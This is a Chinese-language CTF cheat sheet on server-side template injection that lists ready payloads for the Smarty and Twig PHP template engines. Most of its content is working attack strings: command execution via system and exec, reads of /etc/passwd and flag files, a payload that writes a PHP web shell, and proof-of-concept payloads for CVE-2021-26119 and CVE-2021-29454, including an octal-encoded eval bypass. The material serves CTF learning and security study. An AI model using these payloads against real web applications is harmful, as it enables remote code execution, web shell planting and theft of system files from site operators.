CTF题解：
<https://www.cnblogs.com/bmjoker/p/13508538.html>

CTF题SSTI:
```
一个网页可以参数传参回显，XFF的IP回显，UA回显，日志回显等。
通过回显的注入点注入验证：
{{9*9}}
回显81，则存在模板注入

解题：
大多数题目的flag均藏在系统中的某个文件内
通过模板注入解析读取文件。

```


## **smarty常用注入**
```

php:
查看配置
{config}
{$smarty.version}

{system("cat ../../../../../../flag")}
{system("ls")}


{if readfile('/flag')}{/if}
{if phpinfo()}{/if}
{if system('ls')}{/if}
{if system('cat /flag')}{/if}


{self::getStreamVariable(“file:///etc/passwd”)}


string:{include file='C:/Windows/win.ini'}



string:{function name='x(){};system(whoami);function '}{/function}



string:{$smarty.template->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
```

```
CVE-2021-26119
POC:
string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->enableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addPluginsDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setPluginsDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setCompileDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setCacheDir('./x')->display('string:{system(whoami)}')}

漏洞原因：可以通过 {$smarty.template_object} 访问到 smarty 对象所导致
```
```
CVE-2021-29454
POC：
eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}
漏洞原因：libs/plugins/function.math.php 中的 smarty_function_math 执行了 eval()，而 eval() 的数据可以通过 8 进制数字绕过正则表达式
版本限制：在 3.1.42 和 4.0.2 中修复，小于这两个版本可用
```

<https://xz.aliyun.com/t/11108?time__1311=Cq0x2DgD0Q3xlEzIx7KD%3Dqi%3DDOU8QUfox#toc-6>









^
## **twig常用的注入payload**
php7.3
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
```

